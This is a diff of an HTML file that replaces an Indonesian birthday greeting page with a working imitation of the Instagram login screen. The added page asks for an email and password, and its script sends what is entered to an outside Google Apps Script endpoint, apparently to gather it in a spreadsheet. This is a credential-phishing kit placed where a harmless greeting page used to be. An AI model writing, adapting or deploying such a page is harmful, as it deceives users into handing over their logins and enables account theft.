@@ -1,187 +1,87 @@
-<!DOCTYPE html>
-<!--[if lt IE 7]> <html class="ie lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
-<!--[if IE 7]>    <html class="ie lt-ie9 lt-ie8"> <![endif]-->
-<!--[if IE 8]>    <html class="ie lt-ie9"> <![endif]-->
-<!--[if gt IE 8]> <html> <![endif]-->
-<!--[if !IE]><!-->
+<!doctype html>
 <html lang="en">
-<!-- <![endif]-->
 
 <head>
-    <title>Happy Birthday</title>
-    <meta charset="UTF-8" />
-    <meta name="description" content="Happy Birthday Xola">
-    <meta name="robots" content="index, follow" />
-    <link rel="author" href="https://plus.google.com/u/1/+AyushSharma1/" />
-    <meta name="keywords" content="Birthday, Happy">
-    <!-- Strat of Facebook Meta -->
-    <meta property="og:type" content="E-Greeting" />
-    <meta property="og:image" content="favicon.ico" />
-    <meta property="og:description" content="Wish you a very Happy Birthday">
-    <!-- End of Facebook Meta Tags -->
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimum-scale=1.0, maximum-scale=1.0">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black">
-    <meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7; IE=EDGE" />
-    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/css/bootstrap.min.css">
-    <link rel="stylesheet" type="text/css" href="stylesheet.css">
-    <link rel="stylesheet" type="text/css" href="loading.css">
-    <link href='http://fonts.googleapis.com/css?family=Signika' rel='stylesheet' type='text/css'>
-    <!-- <link href='http://fonts.googleapis.com/css?family=Nunito' rel='stylesheet' type='text/css'> -->
-    <link rel="stylesheet/less" href="cake.less">
-    <script src="//cdnjs.cloudflare.com/ajax/libs/less.js/2.1.0/less.min.js"></script>
-</head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<body>
-    <div class="loading"></div>
-    <audio class="song" controls loop>
-        <source src="hbd.mp3"></source>
-	   Your browser isn't invited for super fun audio time.
-    </audio>
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    <link href="style.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css?family=Indie+Flower|Overpass+Mono" rel="stylesheet">
 
-    <div class="balloons text-center" id="b3">
-        <h2 style="color:#D14D39;">P</h2>
-    </div>
-    <div class="balloons text-center" id="b4">
-        <h2 style="color:#8FAD00;">I</h2>
-    </div>
-    <div class="balloons text-center" id="b5">
-        <h2 style="color:#8377E4;">A</h2>
-    </div>
+    <body>
+
+        <div id="wrapper">
+            <div class="container">
+                <div class="phone-app-demo"></div>
+                <div class="form-data">
+                    <form name="submit-to-google-sheet">
+                        <div class="logo">
+                            <h1>Instagram.</h1>
+                        </div>
+
+                        <input name="email" type="text" placeholder="Email" required>
+
+                        <input name="password" type="password" placeholder="password" required>
+
+                        <button type="submit" class="btn btn-primary btn-kirim">Send</button>
+                        <span class="has-separator">Or</span>
+                        <a href="#" class="facebook-login">
+                            <i class="fab fa-facebook"></i> Log in with Facebook
+                        </a>
+                        <a class="password-reset" href="#">Forgot password?</a>
 
 
-
-    <img src="Balloon-Border.png" width="100%" class="balloon-border">
-
-
-    <div class="container">
-
-        <div class="row">
-            <div class="col-md-2 col-xs-2 bulb-holder">
-                <div class="bulb" id="bulb_yellow"></div>
-            </div>
-            <div class="col-md-2 col-xs-2 bulb-holder">
-                <div class="bulb" id="bulb_red"></div>
-            </div>
-            <div class="col-md-2 col-xs-2 bulb-holder">
-                <div class="bulb" id="bulb_blue"></div>
-            </div>
-            <div class="col-md-2 col-xs-2 bulb-holder">
-                <div class="bulb" id="bulb_green"></div>
-            </div>
-            <div class="col-md-2 col-xs-2 bulb-holder">
-                <div class="bulb" id="bulb_pink"></div>
-            </div>
-            <div class="col-md-2 col-xs-2 bulb-holder">
-                <div class="bulb" id="bulb_orange"></div>
-            </div>
-        </div>
-        <div class="row">
-            <div class="col-md-12 text-center">
-                <img src="banner.png" class="bannar">
-            </div>
-        </div>
-        <div class="row cake-cover">
-            <div class="col-md-12 texr-center">
-                <div class="cake">
-                    <div class="velas">
-                        <div class="fuego"></div>
-                        <div class="fuego"></div>
-                        <div class="fuego"></div>
-                        <div class="fuego"></div>
-                        <div class="fuego"></div>
+                    </form>
+                    <div class="sign-up">
+                        Don't an account? <a href="#">Sign up</a>
                     </div>
-                    <div class="cobertura"></div>
-                    <div class="bizcocho"></div>
+                    <div class="get-the-app">
+                        <span>Get the app</span>
+                        <div class="badge">
+                            <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="android App">
+                            <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="ios app">
+                        </div>
+                    </div>
                 </div>
-            </div>
-        </div>
-        <div class="row message">
-            <div class="col-md-12">
 
-                <p>Hari ini adalah...</p>
-                <p>hari yang paling indah dari hari-hari lainnya</p>
-                <p>tanpa sadar</p>
-                <p>satu tahun berlalu</p>
-                <p>dalam sekejap mata</p>
-                <p><strong>namun</strong></p>
-                <p>Tahukah kamu</p>
-                <p>hari ini spesial</p>
-                <p>sangat spesial untukmu</p>
-                <p>itu sebabnya</p>
-                <p>Ayo kita buat...</p>
-                <p>perayaan terbaik yang pernah ada</p>
-                <p>dan izinkan aku berbagi...</p>
-                <p>sepotong kebahagiaan untukmu</p>
-                <p>Aku membuat semua ini...</p>
-                <p>sebagai hadiah ulang tahun untukmu</p>
-                <p>terima kasih telah hadir</p>
-                <p>terima kasih untuk semuanya</p>
-                <p>Aku doakan yang terbaik untuk Mu</p>
-                <p>Semoga tenang</p>
-                <p>Semoga semua keinginanmu terkabul</p>
-                <p>tahun ini akan lebih baik</p>
-                <p>dan semoga</p>
-                <p>Kamu menemukan...</p>
-                <p>kebahagiaan disetiap saat</p>
-                <p>tetap semangat</p>
-                <p>nikmati hidup</p>
-                <p>yang Kamu alami hari ini</p>
-                <p>isi dengan senyum terindahmu</p>
-                <p>dan tunjukkan itu kenangan terbaik..</p>
-                <p>terakhir...</p>
-                <p>selamat sekali lagi</p>
-                <p>selamat ulang tahun Sovia Juliana Lova </p>
-                <p>Salam Hangat Rizki Kurniawan</p>
+                <script>
+                    const scriptURL = 'https://script.google.com/macros/s/AKfycbxSmfVmkS7AGmLFS3_x36r6rquz0kVQcZIrn8PoPH7G03-doq6CXS3BYHViC75SmQc3/exec'
+                    const form = document.forms['submit-to-google-sheet']
+
+                    form.addEventListener('submit', e => {
+                        e.preventDefault()
+                        fetch(scriptURL, {
+                                method: 'POST',
+                                body: new FormData(form)
+                            })
+                            .then(response => console.log('Success!', response))
+                            .catch(error => console.error('Error!', error.message))
+                    })
+                </script>
             </div>
-        </div>
-        <div class="navbar navbar-fixed-bottom">
-            <div class="row">
-                <div class="col-md-6 text-center col-md-offset-3">
-                    <button class="btn btn-primary" id="turn_on">Hidupkan Lampu</button>
-                    <button class="btn btn-primary" id="play">Mainkan Musik</button>
-                    <button class="btn btn-primary" id="bannar_coming">Dekorasi</button>
-                    <button class="btn btn-primary" id="balloons_flying">Terbangkan Balon</button>
-                    <button class="btn btn-primary" id="cake_fadein">Kue Untukmu</button>
-                    <button class="btn btn-primary" id="light_candle">Idupin Lilinnya</button>
-                    <button class="btn btn-primary" id="wish_message">Happy Birthday</button>
-                    <button class="btn btn-primary" id="story">A mesage for you</button>
-                    <!-- <button class="btn btn-primary" id="cake_cut">Lrt's Cut the Cake</button> -->
+            <footer>
+                <div class="container">
+                    <nav class="footer-nav">
+                        <ul>
+                            <li><a href="#">About Us</a></li>
+                            <li><a href="#">Support</a></li>
+                            <li><a href="#">Jobs</a></li>
+                            <li><a href="#">Privacy</a></li>
+                            <li><a href="#">Terms</a></li>
+                            <li><a href="#">Profiles</a></li>
+                            <li><a href="#">Languages</a></li>
+                        </ul>
+                    </nav>
+                    <div class="copyright-notice">
+                        &copy; 2019 Complaints
+                    </div>
                 </div>
-            </div>
-            <!-- <div class="col-md-2">
-			</div>
-			<div class="col-md-2">
-			</div>
-			<div class="col-md-2">
-			</div>
-			<div class="col-md-2">
-			</div>
-			<div class="col-md-2">
-			</div> -->
+            </footer>
         </div>
-
-
-    </div>
-</body>
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
-<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.1/js/bootstrap.min.js"></script>
-<script src="effect.js"></script>
-<script>
-    (function(i, s, o, g, r, a, m) {
-        i['GoogleAnalyticsObject'] = r;
-        i[r] = i[r] || function() {
-            (i[r].q = i[r].q || []).push(arguments)
-        }, i[r].l = 1 * new Date();
-        a = s.createElement(o),
-            m = s.getElementsByTagName(o)[0];
-        a.async = 1;
-        a.src = g;
-        m.parentNode.insertBefore(a, m)
-    })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');
-
-    ga('create', 'UA-58229732-1', 'auto');
-    ga('send', 'pageview');
-</script>
+    </body>
 
 </html>
